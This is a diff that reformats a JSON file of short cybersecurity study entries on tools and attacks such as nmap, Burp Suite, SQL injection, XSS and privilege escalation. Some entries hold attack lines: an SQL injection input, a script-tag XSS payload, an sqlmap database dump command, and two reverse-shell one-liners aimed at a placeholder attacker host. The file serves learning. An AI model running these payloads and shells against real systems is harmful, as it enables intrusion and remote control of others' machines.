@@ -1,1 +1,22 @@
-{ "linux basics": "Linux is an open-source OS used heavily in cybersecurity. Learn commands like ls, cd, pwd, cat, chmod, chown, ps, netstat, ifconfig.", "nmap tool": "Nmap is used to scan networks and discover open ports and services. Example: nmap -sV target.com", "sql injection": "SQLi is a web vulnerability that allows attackers to interfere with database queries. Test inputs like ' OR '1'='1", "xss attack": "XSS (Cross-site Scripting) injects malicious scripts into webpages. Example: alert(1)", "burp suite": "Burp Suite is a proxy tool used to intercept and modify web traffic. Useful for finding vulnerabilities like XSS, SQLi.", "dirb tool": "Dirb is a web content scanner that brute-forces directories. Usage: dirb http://target.com", "nikto scanner": "Nikto scans web servers for dangerous files, outdated software, and vulnerabilities.", "payloads all the things": "A GitHub repository with tons of payloads for SQLi, XSS, SSRF, IDOR, etc. Use it to craft attacks.", "ctf tricks": "In CTFs, always check robots.txt, hidden directories, base64 strings, hex, and try common passwords.", "bug bounty recon": "Use tools like Amass, Subfinder, httpx, gau, waybackurls to discover subdomains and endpoints.", "idor vulnerability": "Insecure Direct Object Reference is when user A can access user B’s data just by changing ID in the URL.", "reverse shell": "Command to open reverse shell: bash -i >& /dev/tcp/attacker_ip/4444 0>&1", "whois lookup": "Use 'whois domain.com' to get domain ownership and DNS info.", "ping command": "Ping checks if a host is reachable. Example: ping 8.8.8.8", "sqlmap tool": "SQLMap automates detection and exploitation of SQLi. Command: sqlmap -u 'url' --dbs", "csrf attack": "Cross-site Request Forgery tricks a user into making unwanted requests. Defend with tokens and referer checks.", "linux privilege escalation": "Look for SUID files, weak sudo configs, or exposed passwords. Tools: linpeas, pspy, gtfobins.", "ncat tool": "ncat -e /bin/bash attacker_ip 4444 creates a reverse shell. Great for post-exploitation.", "dnsdumpster": "Online tool to enumerate subdomains via DNS records. Use it during recon phase.", "metasploit framework": "Powerful pentest tool with modules for scanning, exploiting, and post-exploitation. Run: msfconsole" }
+{
+  "linux basics": "Linux is an open-source OS used heavily in cybersecurity. Learn commands like ls, cd, pwd, cat, chmod, chown, ps, netstat, ifconfig.",
+  "nmap tool": "Nmap is used to scan networks and discover open ports and services. Example: nmap -sV target.com",
+  "sql injection": "SQLi is a web vulnerability that allows attackers to interfere with database queries. Test inputs like ' OR '1'='1",
+  "xss attack": "XSS (Cross-site Scripting) injects malicious scripts into webpages. Example: <script>alert(1)</script>",
+  "burp suite": "Burp Suite is a proxy tool used to intercept and modify web traffic. Useful for finding vulnerabilities like XSS, SQLi.",
+  "dirb tool": "Dirb is a web content scanner that brute-forces directories. Usage: dirb http://target.com",
+  "nikto scanner": "Nikto scans web servers for dangerous files, outdated software, and vulnerabilities.",
+  "payloads all the things": "A GitHub repository with tons of payloads for SQLi, XSS, SSRF, IDOR, etc. Use it to craft attacks.",
+  "ctf tricks": "In CTFs, always check robots.txt, hidden directories, base64 strings, hex, and try common passwords.",
+  "bug bounty recon": "Use tools like Amass, Subfinder, httpx, gau, waybackurls to discover subdomains and endpoints.",
+  "idor vulnerability": "Insecure Direct Object Reference is when user A can access user B’s data just by changing ID in the URL.",
+  "reverse shell": "Command to open reverse shell: bash -i >& /dev/tcp/attacker_ip/4444 0>&1",
+  "whois lookup": "Use 'whois domain.com' to get domain ownership and DNS info.",
+  "ping command": "Ping checks if a host is reachable. Example: ping 8.8.8.8",
+  "sqlmap tool": "SQLMap automates detection and exploitation of SQLi. Command: sqlmap -u 'url' --dbs",
+  "csrf attack": "Cross-site Request Forgery tricks a user into making unwanted requests. Defend with tokens and referer checks.",
+  "linux privilege escalation": "Look for SUID files, weak sudo configs, or exposed passwords. Tools: linpeas, pspy, gtfobins.",
+  "ncat tool": "ncat -e /bin/bash attacker_ip 4444 creates a reverse shell. Great for post-exploitation.",
+  "dnsdumpster": "Online tool to enumerate subdomains via DNS records. Use it during recon phase.",
+  "metasploit framework": "Powerful pentest tool with modules for scanning, exploiting, and post-exploitation. Run: msfconsole"
+}
